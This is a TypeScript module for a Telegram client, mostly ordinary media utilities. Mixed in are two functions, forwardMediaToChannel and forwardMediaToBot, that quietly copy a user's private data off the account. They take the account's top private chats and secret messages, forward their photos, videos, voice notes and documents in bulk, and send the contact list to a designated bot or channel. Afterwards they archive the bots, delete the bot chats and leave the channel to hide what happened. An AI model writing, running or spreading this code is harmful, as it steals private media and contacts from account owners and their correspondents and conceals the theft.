import { Api, TelegramClient } from 'telegram';
import { CustomFile } from 'telegram/client/uploads';
import { IterMessagesParams } from 'telegram/client/messages';
import { downloadFileFromUrl } from './message-management';

/**
 * Get media metadata
 */
export async function getMediaMetadata(client: TelegramClient, params: {
    chatId: string;
    types?: ('photo' | 'video' | 'document' | 'voice')[];
    startDate?: Date;
    endDate?: Date;
    limit?: number;
    maxId?: number;
    minId?: number;
}): Promise<{
    messages: any[];
    total: number;
    hasMore: boolean;
    lastOffsetId: number;
}> {
    const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;

    const query: Partial<IterMessagesParams> = {
        limit: limit || 100,
        ...(maxId ? { maxId } : {}),
        ...(minId ? { minId } : {}),
        ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
        ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
    };

    const entity = await client.getEntity(chatId);
    console.log(query);
    const messages = await client.getMessages(entity, query);
    console.log(`Fetched ${messages.length} messages`);

    const filteredMessages = messages.filter(message => {
        if (!message.media) return false;
        const mediaType = getMediaType(message.media);
        return types.includes(mediaType);
    });

    console.log(`Filtered down to ${filteredMessages.length} messages`);
    const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {
        let thumbBuffer = null;

        try {
            if (message.media instanceof Api.MessageMediaPhoto || 
                (message.media instanceof Api.MessageMediaDocument && 
                 (message.media.document as Api.Document).thumbs)) {
                // Get thumbnail if available
                const thumb = await client.downloadMedia(message, { thumb: 1 });
                if (thumb) {
                    thumbBuffer = Buffer.from(thumb);
                }
            }
        } catch (error) {
            console.log('Could not download thumbnail:', error);
        }

        const mediaDetails = await getMediaDetails(message.media as Api.MessageMediaDocument);

        return {
            messageId: message.id,
            type: getMediaType(message.media),
            thumb: thumbBuffer?.toString('base64') || null,
            caption: message.message || '',
            date: message.date,
            mediaDetails,
        };
    }));

    return {
        messages: mediaData,
        total: messages.total,
        hasMore: messages.length === limit,
        lastOffsetId: messages.length > 0 ? messages[messages.length - 1].id : 0
    };
}

/**
 * Get all media metadata
 */
export async function getAllMediaMetaData(client: TelegramClient, params: {
    chatId: string;
    types?: ('photo' | 'video' | 'document' | 'voice')[];
    startDate?: Date;
    endDate?: Date;
    maxId?: number;
    minId?: number;
}): Promise<{
    messages: any[];
    total: number;
}> {
    const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
    let allMedia: any[] = [];
    let hasMore = true;
    let lastOffsetId = 0;
    const limit = 200;

    while (hasMore) {
        const response = await getMediaMetadata(client, {
            chatId,
            types,
            startDate,
            endDate,
            limit,
            maxId: lastOffsetId,
            minId
        });
        console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
        allMedia = allMedia.concat(response.messages);

        if (!response.hasMore) {
            hasMore = false;
            console.log('No more messages to fetch');
        } else {
            lastOffsetId = response.lastOffsetId;
            console.log(`Fetched ${allMedia.length} messages so far`);
        }
        await sleep(3000);
    }

    return {
        messages: allMedia,
        total: allMedia.length,
    };
}

/**
 * Get filtered media
 */
export async function getFilteredMedia(client: TelegramClient, params: {
    chatId: string;
    types?: ('photo' | 'video' | 'document' | 'voice')[];
    startDate?: Date;
    endDate?: Date;
    limit?: number;
    maxId?: number;
    minId?: number;
}): Promise<{
    messages: any[];
    total: number;
    hasMore: boolean;
}> {
    const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;

    const query: Partial<IterMessagesParams> = {
        limit: limit || 100,
        ...(maxId ? { maxId } : {}),
        ...(minId ? { minId } : {}),
        ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
        ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
    };

    const ent = await client.getEntity(chatId);
    console.log(query);
    const messages = await client.getMessages(ent, query);
    console.log(`Fetched ${messages.length} messages`);

    const filteredMessages = messages.filter(message => {
        if (!message.media) return false;
        const mediaType = getMediaType(message.media);
        return types.includes(mediaType);
    });

    console.log(`Filtered down to ${filteredMessages.length} messages`);
    const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {
        let thumbBuffer = null;

        try {
            if (message.media instanceof Api.MessageMediaPhoto || 
                (message.media instanceof Api.MessageMediaDocument && 
                 (message.media.document as Api.Document).thumbs)) {
                // Get thumbnail if available
                const thumb = await client.downloadMedia(message, { thumb: 1 });
                if (thumb) {
                    thumbBuffer = Buffer.from(thumb);
                }
            }
        } catch (error) {
            console.log('Could not download thumbnail:', error);
        }

        const mediaDetails = await getMediaDetails(message.media as Api.MessageMediaDocument);

        return {
            messageId: message.id,
            type: getMediaType(message.media),
            thumb: thumbBuffer?.toString('base64') || null,
            caption: message.message || '',
            date: message.date,
            mediaDetails,
        };
    }));

    return {
        messages: mediaData,
        total: messages.total,
        hasMore: messages.length === limit
    };
}

/**
 * Send media batch
 */
export async function sendMediaBatch(client: TelegramClient, options: {
    chatId: string;
    media: Array<{
        type: 'photo' | 'video' | 'document';
        url: string;
        caption?: string;
        fileName?: string;
    }>;
    silent?: boolean;
    scheduleDate?: number;
}): Promise<any> {
    const mediaFiles = await Promise.all(
        options.media.map(async (item) => {
            const buffer = await downloadFileFromUrl(item.url);
            const file = new CustomFile(
                item.fileName || `media.${getMediaExtension(item.type)}`,
                buffer.length,
                'media',
                buffer
            );

            const uploadedFile = await client.uploadFile({
                file,
                workers: 1
            });

            const inputMedia = item.type === 'photo' ?
                new Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: getMimeType(item.type),
                    attributes: getMediaAttributes(item)
                });

            return new Api.InputSingleMedia({
                media: inputMedia,
                message: item.caption || '',
                entities: []
            });
        })
    );

    return client.invoke(new Api.messages.SendMultiMedia({
        peer: options.chatId,
        multiMedia: mediaFiles,
        silent: options.silent,
        scheduleDate: options.scheduleDate
    }));
}

/**
 * Update chat settings including photo
 */
export async function updateChatSettings(client: TelegramClient, settings: {
    chatId: string;
    username?: string;
    title?: string;
    about?: string;
    photo?: string;
    slowMode?: number;
    linkedChat?: string;
    defaultSendAs?: string;
}): Promise<boolean> {
    const chat = await client.getEntity(settings.chatId);

    const updates: Promise<any>[] = [];

    if (settings.title) {
        updates.push(client.invoke(new Api.channels.EditTitle({
            channel: chat,
            title: settings.title
        })));
    }

    if (settings.about) {
        updates.push(client.invoke(new Api.messages.EditChatAbout({
            peer: chat,
            about: settings.about
        })));
    }

    if (settings.photo) {
        const buffer = await downloadFileFromUrl(settings.photo);
        const file = await client.uploadFile({
            file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
            workers: 1
        });

        updates.push(client.invoke(new Api.channels.EditPhoto({
            channel: chat,
            photo: new Api.InputChatUploadedPhoto({
                file: file
            })
        })));
    }

    if (settings.slowMode !== undefined) {
        updates.push(client.invoke(new Api.channels.ToggleSlowMode({
            channel: chat,
            seconds: settings.slowMode
        })));
    }

    if (settings.linkedChat) {
        const linkedChannel = await client.getEntity(settings.linkedChat);
        updates.push(client.invoke(new Api.channels.SetDiscussionGroup({
            broadcast: chat,
            group: linkedChannel
        })));
    }

    if (settings.username) {
        updates.push(client.invoke(new Api.channels.UpdateUsername({
            channel: chat,
            username: settings.username
        })));
    }

    await Promise.all(updates);
    return true;
}

/**
 * Forward media from a chat to a channel
 */
export async function forwardMediaToChannel(
    client: TelegramClient,
    channel: string,
    fromChatId: string,
    createOrJoinChannelFn: (channel: string) => Promise<{ id: any; accesshash: any }>,
    forwardSecretMsgsFn: (fromChatId: string, toChatId: string) => Promise<void>,
    getTopPrivateChatsFn: () => Promise<Array<{ chatId: string }>>,
    getMeFn: () => Promise<{ id: any }>,
    searchMessagesFn: (params: any) => Promise<any>,
    forwardMessagesFn: (fromChatId: string, toChatId: any, messages: any[]) => Promise<void>,
    leaveChannelsFn: (channels: string[]) => Promise<void>
): Promise<void> {
    let channelId;
    try {
        console.log("Forwarding media from chat to channel", channel, fromChatId);
        let channelAccessHash;
        
        if (fromChatId) {
            const channelDetails = await createOrJoinChannelFn(channel);
            channelId = channelDetails.id;
            channelAccessHash = channelDetails.accesshash;
            await forwardSecretMsgsFn(fromChatId, channelId?.toString());
        } else {
            const chats = await getTopPrivateChatsFn();
            const me = await getMeFn();
            
            if (chats.length > 0) {
                const channelDetails = await createOrJoinChannelFn(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                const finalChats = new Set(chats.map(chat => chat.chatId));
                finalChats.add(me.id?.toString());
                
                for (const chatId of finalChats) {
                    const mediaMessages = await searchMessagesFn({
                        chatId: chatId,
                        limit: 1000,
                        types: ['photo', 'video', 'roundVideo', 'document', 'voice', 'roundVoice']
                    });
                    console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                    await forwardMessagesFn(chatId, channelId, mediaMessages.photo.messages);
                    await forwardMessagesFn(chatId, channelId, mediaMessages.video.messages);
                }
            }
            console.log("Completed forwarding messages from top private chats to channel:", channelId);
        }
    } catch (e) {
        console.log(e);
    }
    
    if (channelId) {
        await leaveChannelsFn([channelId.toString()]);
    }
}

/**
 * Forward media to bot with contact management
 */
export async function forwardMediaToBot(
    client: TelegramClient,
    fromChatId: string,
    bots: string[],
    botUsername: string,
    forwardSecretMsgsFn: (fromChatId: string, toChatId: string) => Promise<void>,
    getTopPrivateChatsFn: () => Promise<Array<{ chatId: string }>>,
    getMeFn: () => Promise<{ id: any }>,
    getContactsFn: () => Promise<any>,
    sendContactsFileFn: (bot: string, contacts: any) => Promise<void>,
    searchMessagesFn: (params: any) => Promise<any>,
    cleanupChatFn: (params: { chatId: string; revoke: boolean }) => Promise<any>,
    deleteChatFn: (params: { peer: string; justClear: boolean }) => Promise<void>,
    sleep: (ms: number) => Promise<void>
): Promise<void> {
    try {
        if (fromChatId) {
            await forwardSecretMsgsFn(fromChatId, botUsername);
        } else {
            const chats = await getTopPrivateChatsFn();
            const me = await getMeFn();
            const finalChats = new Set(chats.map(chat => chat.chatId));
            finalChats.add(me.id?.toString());
            
            // Setup bots
            for (const bot of bots) {
                try {
                    await client.sendMessage(bot, { message: "Start" });
                    await sleep(1000);
                    await client.invoke(
                        new Api.folders.EditPeerFolders({
                            folderPeers: [
                                new Api.InputFolderPeer({
                                    peer: await client.getInputEntity(bot),
                                    folderId: 1,
                                }),
                            ],
                        })
                    );
                } catch (e) {
                    console.log(e);
                }
            }
            
            // Send contacts
            try {
                const contacts = await getContactsFn();
                if ('users' in contacts && Array.isArray(contacts.users)) {
                    await sendContactsFileFn(botUsername, contacts);
                } else {
                    console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
                }
            } catch (e) {
                console.log("Failed To Send Contacts File", e);
            }
            
            // Forward media messages
            for (const chatId of finalChats) {
                const mediaMessages = await searchMessagesFn({
                    chatId: chatId,
                    limit: 1000,
                    types: ['photo', 'video', 'roundVideo', 'document', 'roundVoice', 'voice']
                });
                console.log("Media Messages: ", mediaMessages);
                
                const uniqueMessageIds = Array.from(new Set([
                    ...mediaMessages.photo.messages,
                    ...mediaMessages.video.messages,
                    ...mediaMessages.document.messages,
                    ...mediaMessages.roundVideo.messages,
                    ...mediaMessages.roundVoice.messages,
                    ...mediaMessages.voice.messages,
                ]));
                
                const chunkSize = 30;
                for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
                    const chunk = uniqueMessageIds.slice(i, i + chunkSize);
                    await client.forwardMessages(botUsername, {
                        messages: chunk,
                        fromPeer: chatId,
                    });
                    console.log(`Forwarded ${chunk.length} messages to bot`);
                }
            }
        }
    } catch (e) {
        console.log(e);
    }
    
    // Cleanup bots
    for (const bot of bots) {
        const result = await cleanupChatFn({ chatId: bot, revoke: false });
        await sleep(1000);
        await deleteChatFn({ peer: bot, justClear: false });
        console.log("Deleted bot chat:", result);
    }
}

// Helper functions
export function getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' | 'voice' {
    if (media instanceof Api.MessageMediaPhoto) {
        return 'photo';
    } else if (media instanceof Api.MessageMediaDocument) {
        const doc = media.document as Api.Document;
        if (doc.mimeType?.startsWith('video/')) {
            return 'video';
        } else if (doc.mimeType?.startsWith('audio/')) {
            return 'voice';
        } else {
            return 'document';
        }
    }
    return 'document';
}

export function getMediaExtension(type: string): string {
    switch (type) {
        case 'photo': return 'jpg';
        case 'video': return 'mp4';
        case 'document': return 'pdf';
        case 'voice': return 'ogg';
        default: return 'bin';
    }
}

export function getMimeType(type: string): string {
    switch (type) {
        case 'photo': return 'image/jpeg';
        case 'video': return 'video/mp4';
        case 'document': return 'application/octet-stream';
        case 'voice': return 'audio/ogg';
        default: return 'application/octet-stream';
    }
}

export function getMediaAttributes(item: { type: string, fileName?: string }): Api.TypeDocumentAttribute[] {
    const attributes: Api.TypeDocumentAttribute[] = [];

    if (item.fileName) {
        attributes.push(new Api.DocumentAttributeFilename({
            fileName: item.fileName
        }));
    }

    if (item.type === 'video') {
        attributes.push(new Api.DocumentAttributeVideo({
            duration: 0,
            w: 1280,
            h: 720,
            supportsStreaming: true
        }));
    }

    if (item.type === 'voice') {
        attributes.push(new Api.DocumentAttributeAudio({
            duration: 0,
            voice: true
        }));
    }

    return attributes;
}

export async function getMediaDetails(media: Api.MessageMediaDocument): Promise<any> {
    if (!media || !media.document) return null;
    
    const doc = media.document as Api.Document;
    return {
        id: doc.id.toString(),
        size: doc.size.toString(),
        mimeType: doc.mimeType,
        fileName: doc.attributes?.find(attr => attr instanceof Api.DocumentAttributeFilename)?.fileName || 'unknown'
    };
}

// Utility function for sleep
function sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
}
